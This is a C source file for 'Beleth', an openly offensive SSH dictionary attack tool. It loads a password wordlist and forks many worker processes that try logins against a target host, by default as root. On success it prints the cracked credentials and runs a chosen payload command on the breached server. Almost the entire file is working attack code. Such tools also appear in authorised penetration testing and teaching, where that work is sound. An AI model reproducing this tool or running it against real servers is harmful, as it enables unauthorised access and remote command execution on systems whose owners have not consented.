/*
 * Beleth - SSH Dictionary Attack
 * beleth.c -- Main functions
 */

#include <libssh2.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/un.h>
#include <sys/wait.h>

#include "beleth.h"
#include "lists.h"
#include "ssh.h"

char *sock_file = "beleth.sock";
char username[50] = "root";
char cmdline[256] = "uname -a && id";
unsigned int sleep_timeout = 400; /* used for usleep on reconnects */

/*
 * Add each line of the wordlist to the linked list
 */
int read_wordlist(char *path) {
	FILE *wordlist;
	char line[256];
	int cnt = 0;

	wordlist = fopen(path,"r");
	if (wordlist == NULL) {
		fprintf(stderr,"[!] Unable to open file %s\n",path);
		return -1;
	}

	while (fgets(line,sizeof(line)-1, wordlist) != NULL) {
			++cnt;
			line[strlen(line)-1] = '\0'; /* Trim of new line */
			add_pw_list(line);
	}

	fprintf(stdout, "[*] Read %d passwords from file.\n",cnt);

	fclose(wordlist);
	return 1;
}

/* Display beleth command usage */
void print_help(char *cmd) {
	fprintf(stderr,"Usage: %s [OPTIONS]\n",cmd);
	fprintf(stderr,"\t-c [payload]\tExecute payload on remote server once logged in\n");
	fprintf(stderr,"\t-h\t\tDisplay this help\n");
	fprintf(stderr,"\t-l [threads]\tLimit threads to given number. Default: 10\n");
	fprintf(stderr,"\t-p [port]\tSpecify remote port\n");
	fprintf(stderr,"\t-P [password]\tUse single password attempt\n");
	fprintf(stderr,"\t-t [target]\tAttempt connections to this server\n");
	fprintf(stderr,"\t-u [user]\tAttempt connection using this username\n");
	fprintf(stderr,"\t-v\t\t-v (Show attempts) -vv (Show debugging)\n");
	fprintf(stderr,"\t-w [wordlist]\tUse this wordlist. Defaults to wordlist.txt\n");
}

/* Display banner */
void print_banner()
{
	int i;
	int with = 40;
	struct printTextFormat utf8format = {
		"\342\224\214", /* ┌ */
		"\342\224\220", /*  ┐*/
		"\342\224\224", /*└  */
		"\342\224\230", /* ┘ */
		"\342\224\200", /* ─ */
		"\342\224\202"  /* │ */
	};

	printf("\e[32m\e[40m");
	printf("%s", utf8format.tlc);
	for (i = 0; i < with; ++i)
		printf("%s", utf8format.hrb);
	printf("%s\n", utf8format.trc);

	printf("%s", utf8format.vrb);
	printf("                 Beleth                 ");
	printf("%s\n", utf8format.vrb);

	printf("%s", utf8format.vrb);
	printf("          www.chokepoint.net            ");
	printf("%s\n", utf8format.vrb);

	printf("%s", utf8format.blc);
	for (i = 0; i < with; ++i)
		printf("%s", utf8format.hrb);
	printf("%s", utf8format.brc);
	printf("\e[0m\n");
}
/*
 * crack_thread
 * Called as the child process of fork.
 */
void crack_thread(struct t_ctx *c_thread) {
	char buf[256];
	int rc;

	if (verbose >= VERBOSE_DEBUG)
		fprintf(stderr, "[*] (%d) Connecting to: %s:%d\n",getpid(),c_thread->host,c_thread->port);


	while ((c_thread->sock = session_init(c_thread->host,c_thread->port,c_thread->session)) == -1) {
		if (verbose >= VERBOSE_DEBUG)
			fprintf(stderr,"[!] Unable to connect to %s:%d\n",c_thread->host,c_thread->port);
		session_cleanup(c_thread->sock, c_thread->session);
		c_thread->session = libssh2_session_init();

		usleep(sleep_timeout);
	}

	while (1) {
		memset(buf,0x00,sizeof(buf));
		snprintf(buf, sizeof(buf)-1,"%c",REQ_PW);
		write(c_thread->fd, buf, strlen(buf));
		rc = read(c_thread->fd, buf, sizeof(buf)-1);
		if (rc == -1) {
			if (verbose >= VERBOSE_DEBUG)
				fprintf(stderr, "[!] Error reading from UNIX sock\n");
			return;
		}
		if (buf[0] == NO_PW) { /* Cleanup if there's no more work */
			session_cleanup(c_thread->sock, c_thread->session);
			exit(0);
		}

		if (verbose >= VERBOSE_ATTEMPTS)
			fprintf(stderr,"[+] (%d) Trying %s %s\n",getpid(),username,buf);
		if ((rc=libssh2_userauth_password(c_thread->session, username, buf))) {
			if (rc != LIBSSH2_ERROR_AUTHENTICATION_FAILED) {
					session_cleanup(c_thread->sock, c_thread->session);
					c_thread->session = libssh2_session_init();

					while ( (c_thread->sock = session_init(c_thread->host,c_thread->port, c_thread->session)) == -1) {
						if (verbose >= VERBOSE_DEBUG)
							fprintf(stderr, "[!] Unable to reconnect to %s:%d\n",c_thread->host,c_thread->port);
						session_cleanup(c_thread->sock,c_thread->session);
						c_thread->session = libssh2_session_init();
						usleep(sleep_timeout);
					}
			}
		} else {
			printf("[*] Authentication succeeded (%s:%s@%s:%d)\n",username, buf, c_thread->host, c_thread->port);
			printf("[*] Executing: %s\n",cmdline);
			if (drop_payload(c_thread->sock,c_thread->session,(char *)cmdline) == -1) {
				if (verbose >= VERBOSE_DEBUG)
					fprintf(stderr, "Error executing command.\n");
			}
			buf[0] = FND_PW;
			buf[1] = '\0';
			write(c_thread->fd,buf,strlen(buf));
			return;
		}
	}
}

/*
 * listen_sock
 * Handle listening and accepting unix socket domains
 * Returns -1 on error. file descriptor to listening socket on success
 */
int listen_sock(int backlog) {
	struct sockaddr_un addr;
	int fd,optval=1;

	if ((fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
		if (verbose >= VERBOSE_DEBUG)
			fprintf(stderr, "[!] Error setting up UNIX socket\n");
		return -1;
	}

	fcntl(fd, F_SETFL, O_NONBLOCK); /* Set socket to non blocking */
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int));

	memset(&addr,0x00,sizeof(addr));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, sock_file, sizeof(addr.sun_path)-1);

	unlink(sock_file);

	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
		if (verbose >= VERBOSE_DEBUG)
			fprintf(stderr, "[!] Error binding to UNIX socket\n");
		return -1;
	}

	if (listen(fd, backlog) == -1) {
		if (verbose >= VERBOSE_DEBUG)
			fprintf(stderr, "[!] Error listening to UNIX socket\n");
		return -1;
	}

	return fd;
}

/*
 * connect_sock
 * Connect to UNIX sock
 * Returns -1 on no connection and fd on successful connection
 */
int connect_sock(void) {
	int fd;
	struct sockaddr_un addr;

	if ((fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
		if (verbose >= VERBOSE_DEBUG)
			fprintf(stderr, "[!] Error creating UNIX socket\n");
		return -1;
	}

	memset(&addr,0x00,sizeof(addr));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, sock_file, sizeof(addr.sun_path)-1);

	if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
		if (verbose >= VERBOSE_DEBUG)
			fprintf(stderr, "[!] Error connecting to UNIX socket\n");
		return -1;
	}
	return fd;
}

/*
 * init_pw_tasker
 * Loop through passwords and as needed divy them out
 * No Return Value
 */
void init_pw_tasker(int unix_fd, int threads) {
	struct pw_list *current_pw = pw_head;
	int fdmax = unix_fd, i, rc, newfd;
	int child_count=0, auth=0;
	fd_set readfds,master;

	FD_ZERO(&master);
	FD_SET(unix_fd,&master);

	while(1) {
		readfds = master;
		i = select(fdmax+1,&readfds,NULL,NULL,NULL);
		if (i > 0) {
			char buf[256];
			memset(buf,0x00, sizeof(buf));
			for (rc = 0; rc <= fdmax; ++rc) {
				if (FD_ISSET(rc, &readfds)) {
					if (rc == unix_fd && (newfd = accept(unix_fd,NULL,NULL)) != -1) {
						if (newfd > fdmax)
							fdmax = newfd;
						FD_SET(newfd,&master);
						continue;
					}

					read(rc, buf, sizeof(buf)-1);
					switch(buf[0]) {
						case REQ_PW:
							if (current_pw == NULL) {
								buf[0] = NO_PW;
								buf[1] = '\0';
								write(rc,buf,strlen(buf));
								++child_count;
								if (verbose >= VERBOSE_DEBUG)
									fprintf(stderr,"Killing child muahaha: %d / %d\n",child_count,threads);
								if (child_count == 1) /* First child cleaned up */
									printf("[*] Cleaning up child processes.\n");
								if (child_count == threads) {
									close(unix_fd);
									unlink(sock_file);
									destroy_pw_list();
									if (auth == 0)
										printf("[!] No password matches found.\n");
									exit(0);
								}
							} else {
								write(rc, current_pw->pw, strlen(current_pw->pw));
								current_pw = current_pw->next;
							}
							break;
						case FND_PW:
							current_pw = NULL;
							--threads;
							auth=1;
							break;
						default:
							break;
					}
				}
			}
		}
	}
}

int beleth_main(int argc, char *argv[]) {
	int rc, remote_port = 22, c_opt;
	int threads = 10, unix_fd, i;
	int single_pw = 0;
	
	char host[21] = "127.0.0.1", str_wordlist[256] = "wordlist.txt";
	pid_t pid, task_pid;

	verbose = 0;
	rc = libssh2_init (0);

	if (rc != 0) {
		fprintf (stderr, "[!] libssh2 initialization failed (%d)\n", rc);
		return 1;
	}

	if (argc > 1) {
		while ((c_opt = getopt(argc, argv, "hvp:t:u:w:c:l:P:")) != -1) {
			switch(c_opt) {
					case 'h':
						print_help(argv[0]);
						exit(0);
						break;
					case 'v':
						++verbose;
						break;
					case 'p':
						remote_port = atoi(optarg);
						if (remote_port <= 0) {
							fprintf(stderr, "[!] Must enter valid integer for port\n");
							exit(1);
						}
						break;
					case 't':
						strncpy(host,optarg,sizeof(host)-1);
						break;
					case 'u':
						strncpy(username,optarg,sizeof(username)-1);
						break;
					case 'w':
						strncpy(str_wordlist,optarg,sizeof(str_wordlist)-1);
						break;
					case 'c':
						strncpy(cmdline,optarg,sizeof(cmdline)-1);
						break;
					case 'l':
						threads = atoi(optarg);
						if (threads <= 0 || threads >= 100) {
							fprintf(stderr, "[!] Thread limit must be between 1 and 99\n");
							exit(1);
						}
						break;
					case 'P':
						threads = single_pw = 1;
						add_pw_list(optarg);
						break;
					default:
						fprintf(stderr, "[!] Invalid option %c\n",c_opt);
						exit(1);
			}
		}
	} else {
		print_help(argv[0]);
		exit(1);
	}

	/* Print banner */
	print_banner();

	/* Initiate the linked list using the given wordlist */
	if (!single_pw) {
		if (read_wordlist(str_wordlist) == -1)
			return 1;
	} else {
		printf("[*] Loaded one password\n");
	}
	
	printf("[*] Starting task manager\n");
	/* Listen to UNIX socket for IPC */
	if ((unix_fd = listen_sock(threads)) == -1) {
		destroy_pw_list();
		exit(1);
	}

	pid = fork();
	if (pid < 0) {
		fprintf(stderr, "[!] Couldn't fork!\n");
		destroy_pw_list();
		exit(1);
	} else if (pid == 0) { /* Child thread */
		init_pw_tasker(unix_fd, threads	);
	} else {
		task_pid = pid;
	}

	printf("[*] Spawning %d threads\n",threads);
	printf("[*] Starting attack on %s@%s:%d\n",username,host,remote_port);
	/* Loop through and spawn correct number of child threads */
	for (i = 0; i < threads; ++i) {
		struct t_ctx *ptr = (struct t_ctx*)malloc(sizeof(struct t_ctx));

		init_thread_ctx(host, remote_port, ptr);
		pid = fork();
		if (pid < 0) {
			fprintf(stderr, "[!] Couldn't fork!\n");
			destroy_pw_list();
			exit(1);
		} else if (pid == 0)  {					/* child thread */
			crack_thread(t_current);

			if (ptr != NULL)
				free(ptr);
		} else {
			if (ptr != NULL)
				free(ptr);
		}
	}

	int status; /* Wait for the tasker to clean up */
	waitpid(task_pid, &status, 0);

	/* proper cleanup */
	destroy_pw_list();
	libssh2_exit();
	return 0;
}
